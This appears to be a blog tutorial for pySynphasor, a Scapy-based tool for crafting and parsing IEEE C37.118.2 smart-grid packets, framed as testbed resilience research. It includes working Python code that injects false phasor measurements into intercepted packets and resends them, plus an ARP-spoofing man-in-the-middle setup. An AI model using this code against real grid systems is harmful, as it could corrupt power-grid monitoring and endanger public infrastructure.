Have you ever wanted to peek into the bytes flying between Phasor Measurement Units (PMUs) and Phasor Data Concentrator (PDC)
What if you could rebuild those packets, inject false data, and test the grid‚Äôs resilience against real cyberattacks?
Welcome to pySynphasor , a powerful, open-source Python tool that enables packet-level manipulation of IEEE C37.118.2 messages used in synchrophasor-based smart grids.

---

## What is pySynphasor?

`pySynphasor` is a Python module built on top of [Scapy](https://scapy.net/), tailored for:

- Parsing & building **IEEE C37.118.2** packets
- Injecting **False Data Injection Attacks (FDIA)**
- Running **MITM attacks** via ARP spoofing
- Creating **custom PDCs and ¬µPMUs**

üì¶ Install it now:

```bash
pip install pySynphasor
```

## 1. Build a C37.118.2 Command Packet in Python

Let‚Äôs start simple,  construct a basic command packet and inspect it.

### Code

```python
from pySynphasor.synphasor import *

cmdPkt = synphasor(type=4, idcode=10) / synphasor_cmd(cmd=5)
cmdPkt.show2()
print("Raw Bytes:", raw(cmdPkt))
```

### Output (Human-readable)

```
###[ IEEE C37.118.2 COMMON FRAME ]###
  synByte= 0xaa
  type= CMD
  version= Version 2
  framesize= 18
  idcode= 10

###[ synphasor command ]###
  cmd= 5
  chk= 0xb6b3
```

### Output (Machine/Raw)

```
Raw Bytes: b'\xaaB\x00\x12\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xb6\xb3'
```

ust two lines to build a fully valid C37.118 command frame!

## üîç 2. Dissect Real Packets from a Testbed

Captured a packet between a PMU and a PDC? `pySynphasor` will convert it into human-friendly structure.

```python
packet = sniff(count=1)[0]  # Get a packet
packet.show()
```

Output shows layers like:
- Ethernet
- IP/TCP
- IEEE C37.118.2 Common Frame
- Phasor Data (complex numbers)
---

## 3. Inject a False Data Attack (FDIA)

Imagine intercepting a synchrophasor packet and injecting **fake phasor measurements**. Here‚Äôs how we did that in our testbed:

### Code

```python
synPkt = packet['synphasor_data']
synPkt.pmu_data[0].phasors[0] = complex(30, 20)
synPkt.pmu_data[0].phasors[1] = complex(70, 80)

del packet[IP].chksum, packet[TCP].chksum
send(packet)
```

### Visual: Before vs After FDIA

|Measurement|Before Attack|After Attack|
|---|---|---|
|Phasor 1|(2453 + 2444j)|(30 + 20j)|
|Phasor 2|(2954 + 2780j)|(70 + 80j)|
|Phasor 3|(2922 + 2079j)|(unchanged in this demo)|

---

## 4. Man-in-the-Middle (MITM) Attack Setup

We deployed 3 VMs: ¬µPMU, pyPDC, and attacker. Using ARP spoofing, we rerouted traffic via the attacker.

### ARP Poisoning Snapshot

|Device|IP|Original MAC|Spoofed MAC|
|---|---|---|---|
|PMU|10.0.2.4|08:00:27:c9:f7:61|08:00:27:a7:1b:c3|
|PDC|10.0.2.7|08:00:27:69:58:64|08:00:27:a7:1b:c3|
